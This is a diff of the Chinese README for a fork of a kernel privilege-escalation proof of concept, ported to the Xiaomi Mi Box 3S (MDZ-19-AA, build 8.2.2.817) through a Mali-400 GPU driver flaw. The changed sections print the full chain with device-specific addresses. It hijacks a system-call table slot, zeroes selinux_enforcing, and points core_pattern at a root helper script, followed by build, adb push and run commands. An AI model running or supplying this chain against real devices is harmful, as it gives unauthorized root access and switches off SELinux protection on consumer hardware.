@@ -2,14 +2,23 @@
 
 [English](README.md) | **简体中文**
 
-> **本分支面向小米盒子 3S**（MDZ-19-AA，build `8.2.2.817`，Android 6.0.1，内核
+> **来源。** 本仓库最初是
+> [Yeuoly/mitv4-utgard-lpe](https://github.com/Yeuoly/mitv4-utgard-lpe)（MIT）的 fork，
+> 那个仓库记录的是同一处驱动缺陷在小米电视 MiTV4（S905L2）上的利用；它又建立在
+> [lr-m/RIPMaliUtgard](https://github.com/lr-m/RIPMaliUtgard) 的公开研究之上（见第 9 节）。
+> 上游文字在仍然适用的地方保持原样；标注 Mi Box 3S 的章节、§1 里的命令、§8 的构建步骤
+> 由本仓库改写。新增文件：`src/gpwrite.c`、`src/kread.c`、`PORT_MIBOX3S.md`、
+> `FINDING_ADDRESSES.md`。
+>
+> **目标机型。** 小米盒子 3S（MDZ-19-AA，build `8.2.2.817`，Android 6.0.1，内核
 > `3.14.29-301318-g9206404`）。`run.sh` 里已经填好这台机器的两个常量
-> （`SLOT_PHYS=1ee77a0`、`KLN_ADDR=ffffffc00111e5d0`），并驱动本 `Makefile` 编出的两个
-> aarch64 helper；为什么不适用本文其余部分的 MiTV4 地址，见 §2.2 与
+> （`SLOT_PHYS=1ee77a0`、`KLN_ADDR=ffffffc00111e5d0`），并驱动本 `Makefile` 编出的
+> aarch64 helper；本文其余部分的 MiTV4 地址为什么不适用，见 §2.2 与
 > [PORT_MIBOX3S.md](PORT_MIBOX3S.md)。
 
-一条在 **小米电视 MiTV4**（Amlogic S905L2，Mali-400，Utgard DDK）上经过实测验证的完整链路：
-从无特权的 `adb shell`（uid 2000，`u:r:shell:s0`）拿到 `uid=0` 并让 SELinux 变为 permissive。
+一条在 **小米盒子 3S**（MDZ-19-AA，Amlogic S905X，Mali-400，Utgard DDK）上经过实测验证的完整链路：
+从无特权的 `adb shell`（uid 2000，`u:r:shell:s0`）拿到 `uid=0` 并让 SELinux 变为 permissive；
+换成 MiTV4（S905L2）自己的两个常量，同一条链在 §2.1 那台机器上同样成立。
 
 内核侧总共只改动 **132 字节**（`128 + 4`）。没有 ROP、没有堆喷、没有 KASLR bypass、没有使用 CVE。
 
@@ -25,14 +34,18 @@
 # 直接派发进去（arm64：表项 8 字节，参数在 x0..x5，返回值在 x0；本 SoC 没有 PAN，
 # 所以内核可以直接读我们用户态的字符串和缓冲区）。
 
-gpu_arb_write 1f6f7a0 ffffffc00111f308   # 槽位 -> kallsyms_lookup_name
-kfunc sym memcpy                          # -> 0xffffffc0013e75c0   （这就是解析器）
+# --- 小米盒子 3S，build 8.2.2.817：也就是 run.sh 里写死的那两个常量 ---
+gpwrite64 write 1ee77a0 ffffffc00111e5d0  # 槽位 -> kallsyms_lookup_name
+kfunc_new sym memcpy                      # -> 0xffffffc0013e1270   （这就是解析器）
 
-gpu_arb_write 1f6f7a0 <memcpy>            # 槽位 -> memcpy
-kfunc zero   <selinux_enforcing> 4        # SELinux -> permissive
-kfunc str    <core_pattern> "|/data/local/tmp/roothelper.sh"
-# 触发一次 coredump -> 内核以 root 身份执行该脚本
+gpwrite64 write 1ee77a0 <memcpy>          # 同一批槽位 -> memcpy
+kfunc_new zero  0xffffffc0020cff24 4      # selinux_enforcing -> 0
+kfunc_new str   0xffffffc001f1c0c8 '|/data/local/tmp/roothelper.sh'
+crash_for_core                            # 触发 coredump -> 内核以 root 身份执行该脚本
 ```
+
+在 MiTV4 上同一条链用的是那台机器的两个常量
+（`gpu_arb_write 1f6f7a0 ffffffc00111f308`、`kfunc`），见 §2.1 与 §2.2。
 
 `run.sh` 做的就是这件事；除了一个地址之外，其余全部在运行期解析。
 
@@ -40,7 +53,7 @@ kfunc str    <core_pattern> "|/data/local/tmp/roothelper.sh"
 
 ## 2. 受影响的设备
 
-### 2.1 已验证的机型
+### 2.1 已验证的机型（原始设备）：小米电视 MiTV4
 
 | 项 | 值 |
 |---|---|
@@ -52,7 +65,7 @@ kfunc str    <core_pattern> "|/data/local/tmp/roothelper.sh"
 | 缓解措施 | 无 KASLR、**无 PAN**；有 PXN；`panic_on_oops=1`；无 seccomp/userns/bpf |
 | 节点权限 | `/dev/mali` 与 `/dev/ion` 均为 `crw-rw-rw-`（0666） |
 
-### 2.2 已验证的机型（第二台）：小米盒子 3S
+### 2.2 已验证的机型（本仓库的目标）：小米盒子 3S
 
 | 项 | 值 |
 |---|---|
@@ -335,23 +348,22 @@ kfunc str <core_pattern> "|/data/local/tmp/roothelper.sh"
 ## 8. 编译与运行
 
 ```sh
-# 32 位 helper（ion + mali 写引擎）
-arm-linux-gnueabihf-gcc -O1 -static -o gpu_arb_write src/gpu_arb_write.c
-# 64 位 helper（滥发系统调用表槽位）
-aarch64-linux-gnu-gcc  -O1 -static -o kfunc          src/kfunc.c
-
+# 小米盒子 3S 目标：aarch64 helper（gpwrite 绕开了坏掉的 /dev/ion mmap）
+make                     # gpwrite64、kfunc_new、kread、crash_for_core
 # 或者用 zig 当交叉编译器：
 make zig
+# 上游的 32 位 helper，供 MiTV4 / 对照使用：
+make gpu_arb_write gpu_scan
 
-adb push gpu_arb_write kfunc run.sh roothelper.sh /data/local/tmp/
-adb shell 'cd /data/local/tmp && chmod 755 gpu_arb_write kfunc run.sh roothelper.sh && ./run.sh'
+adb push gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh /data/local/tmp/
+adb shell 'cd /data/local/tmp && chmod 755 gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh && ./run.sh'
 ```
 
 如果固件不同，`run.sh` 支持两个覆盖变量：
 
 ```sh
 KLN_ADDR=ffffffc00...   # 你的内核里 kallsyms_lookup_name 的地址
-SLOT_PHYS=1f6f7a0       # sys_call_table[244] 的物理地址
+SLOT_PHYS=1ee77a0       # sys_call_table[244] 的物理地址（小米盒子 3S 8.2.2.817）
 ```
 
 在陌生固件上恢复这两个值，是本 PoC 唯一没有自动化的部分，见第 10 节。
@@ -480,4 +492,6 @@ CVE-2022-34830、CVE-2022-36449（都不是本缺陷）。
 
 ## 15. 许可证
 
-MIT —— 见 `LICENSE`。
+MIT —— 见 `LICENSE`。上游文字与代码版权归 © 2026 Yeuoly
+（[Yeuoly/mitv4-utgard-lpe](https://github.com/Yeuoly/mitv4-utgard-lpe)）；
+本仓库新增的小米盒子 3S 移植部分同样以 MIT 发布。
